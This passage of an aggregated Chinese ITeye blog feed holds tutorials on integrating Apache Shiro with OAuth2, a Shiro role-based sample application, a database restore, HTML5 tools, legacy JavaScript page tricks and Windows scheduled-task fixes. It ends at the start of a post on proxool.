        return authorizationInfo;
    }
    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {
        OAuth2Token oAuth2Token = (OAuth2Token) token;
        String code = oAuth2Token.getAuthCode(); //获取 auth code
        String username = extractUsername(code); // 提取用户名
        SimpleAuthenticationInfo authenticationInfo =
                new SimpleAuthenticationInfo(username, code, getName());
        return authenticationInfo;
    }
    private String extractUsername(String code) {
        try {
            OAuthClient oAuthClient = new OAuthClient(new URLConnectionClient());
            OAuthClientRequest accessTokenRequest = OAuthClientRequest
                    .tokenLocation(accessTokenUrl)
                    .setGrantType(GrantType.AUTHORIZATION_CODE)
                    .setClientId(clientId).setClientSecret(clientSecret)
                    .setCode(code).setRedirectURI(redirectUrl)
                    .buildQueryMessage();
            //获取access token
            OAuthAccessTokenResponse oAuthResponse = 
                oAuthClient.accessToken(accessTokenRequest, OAuth.HttpMethod.POST);
            String accessToken = oAuthResponse.getAccessToken();
            Long expiresIn = oAuthResponse.getExpiresIn();
            //获取user info
            OAuthClientRequest userInfoRequest = 
                new OAuthBearerClientRequest(userInfoUrl)
                    .setAccessToken(accessToken).buildQueryMessage();
            OAuthResourceResponse resourceResponse = oAuthClient.resource(
                userInfoRequest, OAuth.HttpMethod.GET, OAuthResourceResponse.class);
            String username = resourceResponse.getBody();
            return username;
        } catch (Exception e) {
            throw new OAuth2AuthenticationException(e);
        }
    }
}
此Realm首先只支持OAuth2Token类型的Token；然后通过传入的auth code去换取access token；再根据access token去获取用户信息（用户名），然后根据此信息创建AuthenticationInfo；如果需要AuthorizationInfo信息，可以根据此处获取的用户名再根据自己的业务规则去获取。
 
Spring shiro配置（spring-config-shiro.xml）  
<bean id="oAuth2Realm" 
    class="com.github.zhangkaitao.shiro.chapter18.oauth2.OAuth2Realm">
  <property name="cachingEnabled" value="true"/>
  <property name="authenticationCachingEnabled" value="true"/>
  <property name="authenticationCacheName" value="authenticationCache"/>
  <property name="authorizationCachingEnabled" value="true"/>
  <property name="authorizationCacheName" value="authorizationCache"/>
  <property name="clientId" value="c1ebe466-1cdc-4bd3-ab69-77c3561b9dee"/>
  <property name="clientSecret" value="d8346ea2-6017-43ed-ad68-19c0f971738b"/>
  <property name="accessTokenUrl" 
     value="http://localhost:8080/chapter17-server/accessToken"/>
  <property name="userInfoUrl" value="http://localhost:8080/chapter17-server/userInfo"/>
  <property name="redirectUrl" value="http://localhost:9080/chapter17-client/oauth2-login"/>
</bean> 
此OAuth2Realm需要配置在服务端申请的clientId和clientSecret；及用于根据auth code换取access token的accessTokenUrl地址；及用于根据access token换取用户信息（受保护资源）的userInfoUrl地址。 
 
<bean id="oAuth2AuthenticationFilter" 
    class="com.github.zhangkaitao.shiro.chapter18.oauth2.OAuth2AuthenticationFilter">
  <property name="authcCodeParam" value="code"/>
  <property name="failureUrl" value="/oauth2Failure.jsp"/>
</bean> 
此OAuth2AuthenticationFilter用于拦截服务端重定向回来的auth code。  
 
<bean id="shiroFilter" class="org.apache.shiro.spring.web.ShiroFilterFactoryBean">
  <property name="securityManager" ref="securityManager"/>
  <property name="loginUrl" value="http://localhost:8080/chapter17-server/authorize?client_id=c1ebe466-1cdc-4bd3-ab69-77c3561b9dee&amp;response_type=code&amp;redirect_uri=http://localhost:9080/chapter17-client/oauth2-login"/>
  <property name="successUrl" value="/"/>
  <property name="filters">
      <util:map>
         <entry key="oauth2Authc" value-ref="oAuth2AuthenticationFilter"/>
      </util:map>
  </property>
  <property name="filterChainDefinitions">
      <value>
          / = anon
          /oauth2Failure.jsp = anon
          /oauth2-login = oauth2Authc
          /logout = logout
          /** = user
      </value>
  </property>
</bean>
此处设置loginUrl为http://localhost:8080/chapter17-server/authorize
?client_id=c1ebe466-1cdc-4bd3-ab69-77c3561b9dee&amp;response_type=code&amp;redirect_uri=http://localhost:9080/chapter17-client/oauth2-login"；其会自动设置到所有的AccessControlFilter，如oAuth2AuthenticationFilter；另外/oauth2-login = oauth2Authc表示/oauth2-login地址使用oauth2Authc拦截器拦截并进行oauth2客户端授权。
 
测试
1、首先访问http://localhost:9080/chapter17-client/，然后点击登录按钮进行登录，会跳到如下页面： 
 
2、输入用户名进行登录并授权；
3、如果登录成功，服务端会重定向到客户端，即之前客户端提供的地址http://localhost:9080/chapter17-client/oauth2-login?code=473d56015bcf576f2ca03eac1a5bcc11，并带着auth code过去；
4、客户端的OAuth2AuthenticationFilter会收集此auth code，并创建OAuth2Token提交给Subject进行客户端登录；
5、客户端的Subject会委托给OAuth2Realm进行身份验证；此时OAuth2Realm会根据auth code换取access token，再根据access token获取受保护的用户信息；然后进行客户端登录。
 
到此OAuth2的集成就完成了，此处的服务端和客户端相对比较简单，没有进行一些异常检测，请参考如新浪微博进行相应API及异常错误码的设计。   
    
 
 
示例源代码：https://github.com/zhangkaitao/shiro-example；可加群 231889722 探讨Spring/Shiro技术。
        
  
已有 5 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
第十六章  综合实例——《跟我学Shiro》, jinnianshilongnian.iteye.com.blog.2037222, Thu, 27 Mar 2014 08:23:03 +0800

 
目录贴： 跟我学Shiro目录贴
 
简单的实体关系图
 
简单数据字典
用户(sys_user)
名称
类型
长度
描述
id
bigint
 
编号 主键
username
varchar
100
用户名
password
varchar
100
密码
salt
varchar
50
盐
role_ids
varchar
100
角色列表
locked
bool
 
账户是否锁定
组织机构(sys_organization)
名称
类型
长度
描述
id
bigint
 
编号 主键
name
varchar
100
组织机构名
priority
int
 
显示顺序
parent_id
bigint
 
父编号
parent_ids
varchar
100
父编号列表
available
bool
 
是否可用
资源(sys_resource)
名称
类型
长度
描述
id
bigint
 
编号 主键
name
varchar
100
资源名称
type
varchar
50
资源类型，
priority
int
 
显示顺序
parent_id
bigint
 
父编号
parent_ids
varchar
100
父编号列表
permission
varchar
100
权限字符串
available
bool
 
是否可用
角色(sys_role)
名称
类型
长度
描述
id
bigint
 
编号 主键
role
varchar
100
角色名称
description
varchar
100
角色描述
resource_ids
varchar
100
授权的资源
available
bool
 
是否可用
 
资源：表示菜单元素、页面按钮元素等；菜单元素用来显示界面菜单的，页面按钮是每个页面可进行的操作，如新增、修改、删除按钮；使用type来区分元素类型（如menu表示菜单，button代表按钮），priority是元素的排序，如菜单显示顺序；permission表示权限；如用户菜单使用user:*；也就是把菜单授权给用户后，用户就拥有了user:*权限；如用户新增按钮使用user:create，也就是把用户新增按钮授权给用户后，用户就拥有了user:create权限了；available表示资源是否可用，如菜单显示/不显示。
角色：role表示角色标识符，如admin，用于后台判断使用；description表示角色描述，如超级管理员，用于前端显示给用户使用；resource_ids表示该角色拥有的资源列表，即该角色拥有的权限列表（显示角色），即角色是权限字符串集合；available表示角色是否可用。
组织机构：name表示组织机构名称，priority是组织机构的排序，即显示顺序；available表示组织机构是否可用。
用户：username表示用户名；password表示密码；salt表示加密密码的盐；role_ids表示用户拥有的角色列表，可以通过角色再获取其权限字符串列表；locked表示用户是否锁定。
 
此处如资源、组织机构都是树型结构：
id
name
parent_id
parent_ids
1
总公司
0
0/
2
山东分公司
1
0/1/
3
河北分公司
1
0/1/
4
济南分公司
2
0/1/2/
parent_id表示父编号，parent_ids表示所有祖先编号；如0/1/2/表示其祖先是2、1、0；其中根节点父编号为0。
 
为了简单性，如用户-角色，角色-资源关系直接在实体（用户表中的role_ids，角色表中的resource_ids）里完成的，没有建立多余的关系表，如要查询拥有admin角色的用户时，建议建立关联表，否则就没必要建立了。在存储关系时如role_ids=1,2,3,；多个之间使用逗号分隔。
 
用户组、组织机构组本实例没有实现，即可以把一组权限授权给这些组，组中的用户/组织机构就自动拥有这些角色/权限了；另外对于用户组可以实现一个默认用户组，如论坛，不管匿名/登录用户都有查看帖子的权限。
 
更复杂的权限请参考我的《JavaEE项目开发脚手架》：http://github.com/zhangkaitao/es。
 
表/数据SQL
具体请参考
sql/ shiro-schema.sql （表结构）
sql/ shiro-data.sql  （初始数据）
 
默认用户名/密码是admin/123456。
 
实体
具体请参考com.github.zhangkaitao.shiro.chapter16.entity包下的实体，此处就不列举了。
 
DAO
具体请参考com.github.zhangkaitao.shiro.chapter16.dao包下的DAO接口及实现。
 
Service
具体请参考com.github.zhangkaitao.shiro.chapter16.service包下的Service接口及实现。以下是出了基本CRUD之外的关键接口：
public interface ResourceService {
    Set<String> findPermissions(Set<Long> resourceIds); //得到资源对应的权限字符串
    List<Resource> findMenus(Set<String> permissions); //根据用户权限得到菜单
}
public interface RoleService {
    Set<String> findRoles(Long... roleIds); //根据角色编号得到角色标识符列表
    Set<String> findPermissions(Long[] roleIds); //根据角色编号得到权限字符串列表
}
public interface UserService {
    public void changePassword(Long userId, String newPassword); //修改密码
    public User findByUsername(String username); //根据用户名查找用户
    public Set<String> findRoles(String username);// 根据用户名查找其角色
    public Set<String> findPermissions(String username);// 根据用户名查找其权限
} 
Service实现请参考源代码，此处就不列举了。
 
UserRealm实现     
public class UserRealm extends AuthorizingRealm {
    @Autowired private UserService userService;
    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {
        String username = (String)principals.getPrimaryPrincipal();
        SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo();
        authorizationInfo.setRoles(userService.findRoles(username));
        authorizationInfo.setStringPermissions(userService.findPermissions(username));
        System.out.println(userService.findPermissions(username));
        return authorizationInfo;
    }
    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {
        String username = (String)token.getPrincipal();
        User user = userService.findByUsername(username);
        if(user == null) {
            throw new UnknownAccountException();//没找到帐号
        }
        if(Boolean.TRUE.equals(user.getLocked())) {
            throw new LockedAccountException(); //帐号锁定
        }
        return new SimpleAuthenticationInfo(
                user.getUsername(), //用户名
                user.getPassword(), //密码
                ByteSource.Util.bytes(user.getCredentialsSalt()),//salt=username+salt
                getName()  //realm name
        );
    }
}
此处的UserRealm和《第六章Realm及相关对象》中的UserRealm类似，通过UserService获取帐号及角色/权限信息。
 
Web层控制器 
@Controller
public class IndexController {
    @Autowired
    private ResourceService resourceService;
    @Autowired
    private UserService userService;
    @RequestMapping("/")
    public String index(@CurrentUser User loginUser, Model model) {
        Set<String> permissions = userService.findPermissions(loginUser.getUsername());
        List<Resource> menus = resourceService.findMenus(permissions);
        model.addAttribute("menus", menus);
        return "index";
    }
} 
IndexController中查询菜单在前台界面显示，请参考相应的jsp页面；
   
@Controller
public class LoginController {
    @RequestMapping(value = "/login")
    public String showLoginForm(HttpServletRequest req, Model model) {
        String exceptionClassName = (String)req.getAttribute("shiroLoginFailure");
        String error = null;
        if(UnknownAccountException.class.getName().equals(exceptionClassName)) {
            error = "用户名/密码错误";
        } else if(IncorrectCredentialsException.class.getName().equals(exceptionClassName)) {
            error = "用户名/密码错误";
        } else if(exceptionClassName != null) {
            error = "其他错误：" + exceptionClassName;
        }
        model.addAttribute("error", error);
        return "login";
    }
} 
LoginController用于显示登录表单页面，其中shiro authc拦截器进行登录，登录失败的话会把错误存到shiroLoginFailure属性中，在该控制器中获取后来显示相应的错误信息。 
 
@RequiresPermissions("resource:view")
@RequestMapping(method = RequestMethod.GET)
public String list(Model model) {
    model.addAttribute("resourceList", resourceService.findAll());
    return "resource/list";
} 
在控制器方法上使用@RequiresPermissions指定需要的权限信息，其他的都是类似的，请参考源码。
 
Web层标签库
com.github.zhangkaitao.shiro.chapter16.web.taglib.Functions提供了函数标签实现，有根据编号显示资源/角色/组织机构名称，其定义放在src/main/webapp/tld/zhang-functions.tld。
 
Web层异常处理器 
@ControllerAdvice
public class DefaultExceptionHandler {
    @ExceptionHandler({UnauthorizedException.class})
    @ResponseStatus(HttpStatus.UNAUTHORIZED)
    public ModelAndView processUnauthenticatedException(NativeWebRequest request, UnauthorizedException e) {
        ModelAndView mv = new ModelAndView();
        mv.addObject("exception", e);
        mv.setViewName("unauthorized");
        return mv;
    }
} 
如果抛出UnauthorizedException，将被该异常处理器截获来显示没有权限信息。
 
Spring配置——spring-config.xml
定义了context:component-scan来扫描除web层的组件、dataSource（数据源）、事务管理器及事务切面等；具体请参考配置源码。
 
Spring配置——spring-config-cache.xml
定义了spring通用cache，使用ehcache实现；具体请参考配置源码。
 
Spring配置——spring-config-shiro.xml
定义了shiro相关组件。 
<bean id="userRealm" class="com.github.zhangkaitao.shiro.chapter16.realm.UserRealm">
    <property name="credentialsMatcher" ref="credentialsMatcher"/>
    <property name="cachingEnabled" value="false"/>
</bean> 
userRealm组件禁用掉了cache，可以参考https://github.com/zhangkaitao/es/tree/master/web/src/main/java/com/sishuok/es/extra/aop实现自己的cache切面；否则需要在修改如资源/角色等信息时清理掉缓存。 
 
<bean id="sysUserFilter" 
class="com.github.zhangkaitao.shiro.chapter16.web.shiro.filter.SysUserFilter"/> 
sysUserFilter用于根据当前登录用户身份获取User信息放入request；然后就可以通过request获取User。 
  
<property name="filterChainDefinitions">
  <value>
    /login = authc
    /logout = logout
    /authenticated = authc
    /** = user,sysUser
  </value>
</property> 
如上是shiroFilter的filterChainDefinitions定义。 
 
Spring MVC配置——spring-mvc.xml
定义了spring mvc相关组件。 
<mvc:annotation-driven>
  <mvc:argument-resolvers>
    <bean class="com.github.zhangkaitao.shiro.chapter16
        .web.bind.method.CurrentUserMethodArgumentResolver"/>
  </mvc:argument-resolvers>
</mvc:annotation-driven> 
此处注册了一个@CurrentUser参数解析器。如之前的IndexController，从request获取shiro sysUser拦截器放入的当前登录User对象。
 
 
Spring MVC配置——spring-mvc-shiro.xml
定义了spring mvc相关组件。 
<aop:config proxy-target-class="true"></aop:config>
<bean class="org.apache.shiro.spring.security
    .interceptor.AuthorizationAttributeSourceAdvisor">
  <property name="securityManager" ref="securityManager"/>
</bean> 
定义aop切面，用于代理如@RequiresPermissions注解的控制器，进行权限控制。
 
web.xml配置文件
定义Spring ROOT上下文加载器、ShiroFilter、及SpringMVC拦截器。具体请参考源码。
 
JSP页面       
<shiro:hasPermission name="user:create">
    <a href="${pageContext.request.contextPath}/user/create">用户新增</a><br/>
</shiro:hasPermission> 
使用shiro标签进行权限控制。具体请参考源码。
 
系统截图
访问http://localhost:8080/chapter16/；
首先进入登录页面，输入用户名/密码（默认admin/123456）登录： 
登录成功后到达整个页面主页，并根据当前用户权限显示相应的菜单，此处菜单比较简单，没有树型结构显示   
然后就可以进行一些操作，如组织机构维护、用户修改、资源维护、角色授权 
  
相关资料
《跟我学spring3》
     http://www.iteye.com/blogs/subjects/spring3
《跟开涛学SpringMVC》
     http://www.iteye.com/blogs/subjects/kaitao-springmvc
《简单shiro扩展实现NOT、AND、OR权限验证》
     http://jinnianshilongnian.iteye.com/blog/1864800
《Shiro+Struts2+Spring3 加上@RequiresPermissions 后@Autowired失效》
     http://jinnianshilongnian.iteye.com/blog/1850425
 
更复杂的权限请参考我的《JavaEE项目开发脚手架》：http://github.com/zhangkaitao/es，提供了更加复杂的实现。
 
 
 
示例源代码：https://github.com/zhangkaitao/shiro-example；可加群 231889722 探讨Spring/Shiro技术。
        
  
请你欣赏春天美景 http://user.qzone.qq.com/314154083/photo/V10a4ot72FxYVR?ptlang=2052
     
已有 8 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
数据库 还原到某个时间点 通过日志还原, wmswu.iteye.com.blog.2064022, Thu, 08 May 2014 17:46:39 +0800

1.需要完整的数据库备份文件 此文件的备份日期一定要早于 要恢复的日期时间点，
     比如 备份文件时 12:30的 要恢复的时间点是 13:00 的那是可以的 。
    事务日志要最新的 一定要晚于 要恢复的时间点
2.还原时的选项如图
 
3.成功后 右键数据库 选择还原  事务日志  选择日志备份文件。
  设置要还原的时间点 还原。。。 
   
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
10款非常优秀的HTML5开发工具, wmswu.iteye.com.blog.1886641, Fri, 14 Jun 2013 11:19:39 +0800

HTML5发展如火如荼，随着各大浏览器对HTML5技术支持的不断完善以及HTML5技术的不断成熟，未来HTML5必将改变我们创建Web应用程序的方式。今天这篇文章向大家推荐10款优秀的HTML5开发工具，帮助你更高效的编写HTML5应用。
1.Initializr
Initializr是制作HTML5网站最好的入门辅助工具，你可以使用提供的特色模板快速生成网站，也可以自定义，Initializr会为你生成代码简洁的可定制的网页模板。
2.HTML5demos
想知道你的浏览器是否支持HTML5 Canvas吗？想知道Safari是否可以运行简单的HTML5聊天客户端吗？HTML5demos会告诉你每一个HTML5特性在哪些浏览器中支持。
3.HTML5 Tracker
想了解HTML5的最新动向吗？使用HTML5 Tracker吧，它可以跟踪HTML5最新修订信息。
4.HTML5 visual cheat sheet
想要快速超找一个标签或者属性吗？看看这个非常酷的速查手册吧，每个Web开发人员的必备。
5.Switch To HTML5
Switch To HTML5是一个基础而有效模板生成工具。如果你开始一个新项目，可以到这里获取免费的HTML5网站模板。
6.Cross browser HTML5 forms
HTML5中的日历，取色板，滑块部件等都是非常棒工具，但是有些浏览器不支持。这个页面将帮助你构建完美的HTML5表单兼容方案。
7.HTML5 Test
你浏览器准备好迎接HTML5革命了吗？HTML5 Test将告诉你。这个网站会为你当前使用的浏览器生成一份对video、audio、canvas等等特性的支持情况的完整报告。
8.HTML5 Canvas cheat sheet
Canvas元素是HTML5最重要的元素之一，它可以在网页中绘制图形，非常强大。这是一个Canvas元素的详细速查手册。
9.Lime JS
LimeJS是一个HTML5游戏开发框架，用于快速构建运行于触屏设备和桌面浏览器的游戏。非常棒，一定要用用试试。
10.HTML5 Reset
HTML5 Reset是一组文件，包括HTML、CSS等，用于在开始新项目的时候帮助你节省时间，提供HTML5的空白WordPress模板。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
javascript 技巧 不考虑浏览器兼容, wmswu.iteye.com.blog.1881407, Mon, 03 Jun 2013 10:12:36 +0800
1. oncontextmenu="window.event.returnValue=false" 将彻底屏蔽鼠标右键 < table border oncontextmenu=return(false)>< td>no< /table> 可用于Ta bl e 2. < body onselectstart="return false"> 取消选取、防止复制 3. onpaste="return false" 不准粘贴 4. oncopy="return false;" oncut="return false;" 防止复制 5. < link rel="Shortcut Icon" href="favicon.ico"> IE 地址栏前换成自己的图标 6. < link rel="Bookmark" href="favicon.ico"> 可以在收藏夹中显示出你的图标 7. < input style="ime- mode:disabled"> 关闭输入法 8. 永远都会带着框架 < script language="JavaScript">< !-- if (window == top)top.loc ation.href = "frames.htm"; //frames.htm 为框架网页 // -- >< /script> 9. 防止被人frame < SCRIPT LANGUAGE=JAVASCRIPT>< ! -- if (top.location != self.location)top.location=self.location; // -- >< /SCRIPT> 10. 网页将不能被另存为 < noscript>< iframe src=*.html>< /iframe>< /noscri pt> 11. < input type=button value=查看网页源代码 onclick="window.location = "view - source:"+ "http://www.pconline.com.cn""> 12.删除时确认 < a href="javascript:if(confirm(" 确实要删除吗?"))location="boos.asp?&areyou= 删除&page=1"">删除< /a> 13. 取得控件的绝对位置 //Javascript < script language="Javascript"> function getIE(e){ var t=e.offsetTop; var l=e.offsetLeft; while(e=e.offsetParent){ t+=e.offsetTop; l+=e.offsetLeft; } alert("top="+t+"/nleft="+l); } < /script> //VBScript < script language="VBScript">< ! -- function getIE() dim t,l, a,b set a=document.all.img1 t=document.all.img1.offsetTop l=document.all.img1.offsetLeft while a.tagName< >"BODY" set a = a.offsetParent t=t+a.offsetTop l=l+a.offsetLeft wend msgbox "top="&t&chr(13)&"left="&l,64,"得到控件的位置" end function -- >< /script> 14. 光标是停在文本框文字的最后 < script language="javascript"> function cc() { var e = event.srcElement; var r =e.createTextRange(); r.moveStart("character",e.value.length); r.collapse(true); r.select(); } < /script> < input type=text name=text1 value="123" onfocus="cc()"> 15. 判断上一页的来源 javascript: document.referrer 16. 最小化、最大化、关闭窗口 < object id=hh1 classid="clsid:ADB880A6- D8FF- 11CF- 9377- 00AA003B7A11"> < param name="Command" value="Minimize">< /object> < object id=hh2 classid="clsid:ADB880A6- D8FF- 11CF- 9377- 00AA003B7A11"> < param name="Command" value="Maximize">< /object> < OBJECT id=hh3 classid="clsid:adb880a6- d8ff - 11cf - 9377- 00aa003b7a11"> < PARAM NAME="Command" VALUE="Close">< /OBJECT> < input type=button value= 最小化 onclick=hh1.Clic k()> < input type=button value= 最大化 onclick=hh2.Click()> < input type=button value= 关闭 onclick=hh3.Click()> 本例适用于IE 17.屏蔽功能键 Shift,Alt,Ctrl < script> function look(){ if(event.shiftKey) alert(" 禁止按 Shift 键!"); //可以换成A LT CTRL } document.onkeydown=look; < /sc ript> 18. 网页不会被缓存 < META HTTP- EQUIV="pragma" CONTENT="no- cache"> < META HTTP- EQUIV="Cache- Control" CONTENT="no- cache, must - revalidate"> < META HTTP- EQUIV="expires" CONTENT="Wed, 26 Feb 1997 08:21:57 GMT"> 或者< META HTTP- EQUIV="expires" CONTENT="0"> 19.怎样让表单没有凹凸感？ < input type=text style="border:1 solid #000000"> 或 < input type=text style="border- left:none; border - right:none; border- top:none; border - bottom: 1 solid #000000">< /textarea> 20.< div>< span>&< layer>的区别？ < div>(division)用来定义大段的页面元素，会产生转行 < span>用来定义同一行内的元素，跟< div> 的唯一区别是不产生转行 < layer>是ns 的标记，ie 不支持，相当于< div> 21.让弹出窗口总是在最上面: < body onblur="this.focus();"> 22.不要滚动条? 让竖条没有: < body style="overflow:scroll;overflow - y:hidden"> < /body> 让横条没有: < body style="overflow:scroll;overflow - x:hidden"> < /body> 两个都去掉？更简单了 < body scroll="no"> < /body> 23.怎样去掉图片链接点击后，图片周围的虚线？ < a href="#" onFocus="this.blur()">< img src="logo.jpg" border=0>< /a> 24.电子邮件处理提交表单 < form name="form1" method="post" action="mailto:****@***.com" enctype="text/plain"> < input type=submit> < /form> 25.在打开的子窗口刷新父窗口的代码里如何写？ window.opener.location.reload() 26.如何设定打开页面的大小 < body onload="top.resizeTo(300,200);"> 打开页面的位置< body onload="top.moveBy(300,200);"> 27.在页面中如何加入不是满铺的背景图片,拉动页面时背景图不动 < STYLE> body {background- image:url(logo.gif); background - repeat:no - repeat; background - position:center;background - attachment: fixed} < /STYLE> 28. 检查一段字符串是否全由数字组成 < script language="Javascript">< ! -- function checkNum(str){return str.match(//D/)==null} alert(checkNum("1232142141")) alert (checkNum("123214214a1")) // -- >< /script> 29. 获得一个窗口的大小 document.body.clientWidth; document.body.clientHeight 30. 怎么判断是否是字符 if (/[^/x00- /xff]/g.test(s)) alert("含有汉字"); else alert("全是字符"); 31.TEXTAREA 自适应文字行数的多少 < textarea rows=1 name=s1 cols=27 onpropertychange="this.style.posHeight=this.scrollHeight"> < /textarea> 32. 日期减去天数等于第二个日期 < script language=Javascript> function cc(dd,dadd) { // 可以加上错误处理 var a = new Date(dd) a = a.valueOf() a = a - dadd * 24 * 60 * 60 * 1000 a = new Date(a) alert(a.getFullYear() + "年" + (a.getMonth() + 1) + "月" + a.getDate() + "日") } cc("12/23/2002",2) < /script> 33. 选择了哪一个 Radio < HTML>< script language="vbscript"> function checkme() for each ob in radio1 if ob.checked then window.alert ob.value next end function < /script>< BOD Y> < INPUT name="radio1" type="radio" value="style" checked>Style < INPUT name="radio1" type="radio" value="barcode">Barcode < INPUT type="button" value="check" onclick="checkme()"> < /BODY>< /HTML> 34.脚本永不出错 < SCRIPT LANGUAGE="JavaScript"> < !-- Hide function killErrors() { return true; } window.onerror = killErrors; // -- > < /SCRIPT> 35.ENTER 键可以让光标移到下一个输入框 < input onkeydown="if(event.keyCode==13)event.keyCode=9"> 36. 检测某个网站的链接速度： 把如下代码加入< body>区域中: < script language=Javascript> tim=1 setInterval("tim++",100) b=1 var autourl=new Array() autourl[1]="www.njcatv.net" autourl[2]="javacool.3322.net" autourl[3]="www.sina.com.cn" autourl[4]="www.nuaa.edu.cn" autourl[5]="www.cctv.com" function butt(){ document.write("< form name=autof>") for(var i=1;i< au tourl.length;i++) document.write("< input type=text name=txt"+i+" size=10 value= 测试中……> = 》< input type=text name=url"+i+" size=40> = 》< input type=button value=GO onclick=window.open(this.form.url"+i+".value)> ") document.write("< input type=submit value= 刷新>< /form>") } butt() function auto(url){ document.forms[0]["url"+b].value=url if(tim>200) {document.forms[0]["txt"+b].value="链接超时"} else {document.forms[0]["txt"+b].value="时间"+tim/10+" 秒"} b++ } function run(){for(var i=1;i< autourl.length;i++)document.wr ite("< img src=http://"+autourl+"/"+Math.random()+" width=1 height=1 onerror=auto("http://"+autourl+"")>")} run()< /script> 37. 各种样式的光标 auto ：标准光标 default ：标准箭头 hand ：手形光标 wait ：等待光标 text ：I 形光标 vertical - text ：水平I 形光标 no- drop ：不可拖动光标 not- allowed ：无效光标 help ：?帮助光标 all- scroll ：三角方向标 move ：移动标 crosshair ：十字标 e- resize n- resize nw- resize w- resize s- resize se - resize sw- resize 38.页面进入和退出的特效 进入页面< meta http- equiv="Page- Enter" content="revealTrans(duration=x, transition=y)"> 推出页面< meta http- equiv="Page- Exit" con tent="revealTrans(duration=x, transition=y)"> 这个是页面被载入和调出时的一些特效。duration 表示特效的持续时间，以秒为单位。transition 表示使用哪种特效，取值为 1- 23:  0 矩形缩小  1 矩形扩大  2 圆形缩小  3 圆形扩大  4 下到上刷新  5 上到下刷新  6 左到右刷新  7 右到左刷新  8 竖百叶窗  9 横百叶窗  10 错位横百叶窗  11 错位竖百叶窗  12 点扩散  13 左右到中间刷新  14 中间到左右刷新  15 中间到上下  16 上下到中间  17 右下到左上  18 右上到左下  19 左上到右下  20 左下到右上  21 横条  22 竖条  23 以上22种随机选择一种 39.在规定时间内跳转 < M E TA ht t p- equiv=V="REFRESH" content="5;URL=http://www.51j s.com"> 40.网页是否被检索 < meta name="ROBOTS" content="属性值">  其中属性值有以下一些:  属性值为"all": 文件将被检索，且页上链接可被查询；  属性值为"none": 文件不被检索，而且不查询页上的链接；  属性值为"index": 文件将被检索；  属性值为"follow": 查询页上的链接；  属性值为"noindex": 文件不检索，但可被查询链接；  属性值为"nofollow": 文件不被检索，但可查询页上的链接。 41.回车 用客户端脚本在页面添加 document 的onkeydown 事件,让页面在接受到回车事件后,进行Ta b键的功能,即只要把 event的keyCode 由13变为9 Javascript 代码如下: <script language="javascript" for="document" event="onkeydown"> <! --  if(event.keyCode==13)  event.keyCode=9; -- > </script> 这样的处理方式, 可以实现焦点往下移动, 但对于按钮也起同样的作用, 一般的客户在输入完资料以后,跳到按钮后, 最好能直接按" 回车" 进行数据的提交. 因此,对上面的方法要进行一下修改,应该对于" 提交"按钮不进行焦点转移.而直接激活提交. 因此我对上面的代码进行了一个修改,即判断事件的"源", 是否为提交按钮,代码如下: <script language="javascript" fo r="document" event="onkeydown"> <! --  if(event.keyCode==13 && event.srcElement.type!='button' && event.srcElement.type!='submit' && event.srcElement.type!='reset' && event.srcElement.type!='textarea' && event.srcElement.type!='')  event.keyCode=9; -- > </script> 判断是否为button, 是因为在HTML 上会有type="button" 判断是否为submit, 是因为HTML 上会有type="submit" 判断是否为reset,是因为HTML 上的" 重置" 应该要被执行 判断是否为空,是因为对于 HTML 上的"<a> 链接" 也应该被执行,这种情 况发生的情况不多,可以使用"tabindex=- 1" 的方式来取消链接获得焦点.
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
在 Windows server 2008 下计划任务无法正常执行bat批处理文件, wmswu.iteye.com.blog.1507492, Wed, 02 May 2012 11:53:01 +0800
windows server 2008 下计划任务执行批处理，总是提示执行成功，但是批处理该输出的内容却没有输出，解决办法：
如图：编辑任务 把批处理文件的起始位置加上如：在d:\aa.bat 那么起始位置就是：d:\  注：路径中不能有引号
 
下面引用网上的东东：
批处理文件肯定是没有问题，加入到计划任务中，发现没能正常备份，也没有拷贝到网络映射盘。将bat文件输出到文件，本想看看log的，结果居然没有正常执行。 google了一下，发现很多网友都有类似的问题，但没人给出答案。 很幸运的找到一篇微软官方论坛上的网友讨论的帖子，几乎全部解决我的问题。 http://social.technet.microsoft.com/Forums/en-US/winservermanager/thread/d47d116e-10b9-44f0-9a30-7406c86c2fbe/ 很精彩的技术交流。 对我来说碰到了2个问题， 1, a.bat 是处理备份数据库，b.bat 内容为 a.bat > D:/abc/1.log , 将b.bat 加入的计划任务中，目的是想调试计划任务是否成功。（手动单独执行，每次都成功的）结果，是1.log不输出，计划任务中返回2； 2，a.bat 中有把备份好的数据拷贝到网络映射盘，比如Z盘，计划任务每次都不执行，手动运行该脚本也是好的。 按照上面论坛给的提示： 2) Make sure that the task is set to "start in" the folder that contains the batch file: open the task properties, click on the "actions" tab, click on the action and then the "edit" button at the bottom. In the "Edit Action" Window there is a field for "start in (optional)" that you set to the path to the batch file. 在“操作”->"编辑操作"->“起始于(可选)" 中一定要填入 该批处理的路径。 这一招解决了第一个问题。 NET USE W: /DELETE NET USE W: //myserver/myfolder /PERSISTENT:YES 这个是解决第二个问题的关键，在执行拷贝，或者建立新文件夹之前，先要进行如上两行命令。 细节：确保在我的电脑界面通过菜单操作的网络映射盘式断开的；Windows server 2008 用户管理页面有个网络密码管理，如果填写了，net use w: ... 这行命令就不需要输入密码和用户名。 这一招解决第二个问题。 补充一点：批处理文件中和 ”起始于（可选）“中的路径都不要使用 双引号"" 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
proxool中的maximum-active-time 转, wmswu.iteye.com.blog.1387764, Tue, 31 Jan 2012 16:50:27 +0800
近日调试一个项目的时候, 总是在运行一段时间之后出现如下的警告:
 
写道
